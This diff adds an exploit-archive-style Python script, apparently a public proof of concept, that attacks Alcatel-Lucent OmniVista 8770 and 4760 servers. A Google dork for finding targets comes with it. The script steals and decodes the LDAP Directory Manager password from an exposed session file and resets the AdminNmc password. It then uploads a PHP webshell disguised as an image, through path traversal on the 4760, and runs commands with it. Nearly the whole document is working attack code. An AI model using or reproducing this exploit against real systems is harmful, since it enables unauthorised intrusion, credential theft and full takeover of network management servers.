@@ -1,0 +1,176 @@
+# Exploit Title: Alcatel-Lucent Omnivista 8770 - Remote Code Execution
+# Google Dork: inurl:php-bin/webclient.php
+# Date: 2019-12-01
+# Author: 0x1911
+# Vendor Homepage: https://www.al-enterprise.com/
+# Software Link: https://www.al-enterprise.com/en/products/communications-management-security/omnivista-8770-network-management-system
+# Version: All versions, still unpatched
+# Tested on: Windows 2003/2008
+# CVE : 0day
+
+# Exploit attached, also available here https://git.lsd.cat/g/omnivista-rce/src/master/omnivista.py
+# Full writeup at https://git.lsd.cat/g/omnivista-rce/src/master/README.md
+
+
+'''
+Original url: https://git.lsd.cat/g/omnivista-rce
+Website: https://lsd.cat
+'''
+import requests
+import socket
+import ldap
+import sys
+from urllib.parse import urlparse
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+class OmniVista:
+	def __init__(self, host):
+		self.host = host
+		self.addr = (urlparse(self.host).hostname)
+		self.folders = ['php-bin/', 'soap-bin/', 'bin/', 'data/', 'Themes/', 'log/']
+		self.filename = "poc.php"
+		self.webshell = "<?php system($_REQUEST[0]) ?>"
+
+	def identify(self):
+		r = requests.get(self.host + 'php-bin/Webclient.php', verify=False)
+		if '8770' in r.text:
+			return 8770
+		elif '4760' in r.text:
+			return 4760
+		else:
+			return False
+
+	def checkldap(self):
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(10)
+		result = s.connect_ex((self.addr, 389))
+		if result == 0:
+			return True
+
+	def info(self):
+		r = requests.post(self.host + 'php-bin/info.php', data={"void": "phDPhd"}, verify=False)
+		if 'PHP Version' in r.text:
+			return r.text
+		else:
+			return False
+
+	def getpassword(self):
+		r = requests.get(self.host + 'php-bin/Webclient.php', verify=False)
+		id = r.headers['Set-Cookie'].split(";")[0].split("=")[1]
+		r = requests.get(self.host + 'sessions/sess_' + id, verify=False)
+		lenght = int(r.text.split("ldapSuPass")[1][3:5])
+		password = r.text.split("ldapSuPass")[1][7:7+lenght]
+		return password
+
+	def decodepassword(self, password):
+		counter = 0
+		key = 16
+		cleartext = ""
+		if password[0:5] == "{NMC}":
+			password = password[5:]
+		else:
+			return False
+		for char in password:
+			if 32 <= ord(char):
+				char = chr(ord(char) ^ key)
+				cleartext += char
+			else:
+				cleartext += char
+			if ord(char) != 0:
+				key = counter * ord(char) % 255 >> 3
+			else:
+				key = 16
+			counter += 1
+		return cleartext
+
+	def connectldap(self):
+		connect = ldap.initialize('ldap://' + self.addr)
+		connect.set_option(ldap.OPT_REFERRALS, 0)
+		connect.simple_bind_s(self.username, self.password)
+		result = connect.search_s('o=nmc', ldap.SCOPE_SUBTREE, '(cn=AdminNmc)')
+		print('[*] Current AdminNmc password: ' + str(result[0][1]['userpassword'][0]))
+		self.bind = connect
+		return True
+
+	def editadminpassword(self):
+		self.adminusername = "AdminNmc"
+		self.adminpassword = "Lsdcat_exploit1!"
+		self.bind.modify_s("uid=AdminNmc,cn=Administrators,cn=8770 administration,o=nmc", [(ldap.MOD_REPLACE, 'userpassword', self.adminpassword.encode('utf-8') )])
+		return True
+
+	def login(self):
+		self.session = requests.session()
+		r = self.session.post(self.host + 'php-bin/webclient.php', data = {"action": "loginCheck", "userLogin": self.adminusername, "userPass": self.adminpassword }, verify = False)
+		if 'Directory license is required!' in r.text:
+			return False
+		else:
+			return True
+
+	def exploit8770(self):
+		r = self.session.get(self.host + 'php-bin/webclient.php', params = {'action': 'editTheme', 'themeId': "2"}, verify=False)
+		r = self.session.post(self.host + 'php-bin/webclient.php',
+			data = {"action": "saveTheme", "themeId": "2"},
+			files = { "BgImg1": (self.filename, self.webshell, "image/png")},
+			verify = False)
+		if 'success' in r.text:
+			return True
+
+	def exec8770(self):
+		return requests.post(self.host + 'Theme2/' + 'poc.php', data = {"0": cmd}, verify=False).text
+
+	def exploit4760(self):
+		for folder in self.folders:
+			r = requests.post(self.host + 'php-bin/webclient.php',
+				data = {"action": "saveTheme", "themeId": "5/../../{}".format(folder), "themeDate": ""},
+				files = { "BgImg1": (self.filename, self.webshell, "image/png")},
+			verify=False)
+			if 'success' in r.text:
+				self.folder = folder
+				return True
+
+	def exec4760(self, cmd):
+		return requests.post(self.host + self.folder + 'poc.php', data = {"0": cmd}, verify=False).text
+
+	def autoexploit(self):
+		print('[*] Attempting to exploit on {}'.format(self.host))
+		self.model = self.identify()
+		if self.model == 4760:
+			print('[*] Model is {}'.format(str(self.model)))
+			self.exploit4760()
+			print('[*] Upload folder is {}'.format(self.folder))
+			output = self.exec4760("whoami")
+			print('[*] Webshell at {}{}{}'.format(self.host, self.folder, self.filename))
+			print('[*] Command output: '.format(output))
+		elif self.model == 8770:
+			print('[*] Model is {}'.format(str(self.model)))
+			self.username = "cn=Directory Manager"
+			self.password = self.decodepassword(self.getpassword())
+			print('[*] {} password is "{}"'.format(self.username, self.password))
+			if self.checkldap():
+				print('[*] LDAP Service is accessible!')
+				self.connectldap()
+				print('[*] Changing AdminNmc password')
+				self.editadminpassword()
+				print('[*] Logging in')
+				if self.login():
+					self.exploit8770()
+					output = self.exec8770("whoami")
+					print('[*] Webshell at {}{}{}'.format(self.host, "themes/Theme2/", self.filename))
+					print('[*] Command output: '.format(output))
+				else:
+					print("[x] Directory license not installed :/")
+					return False
+			else:
+				print("[x] LDAP Service is not directly accessible")
+				return False
+
+		else:
+			print("[x] Target is not an OmniVista 4760/8770")
+			return False
+
+if len(sys.argv) != 2:
+	print("Usage: ./omnivista.py http(s)://target.tld:port/")
+else:
+	exploit = OmniVista(sys.argv[1])
+	exploit.autoexploit()
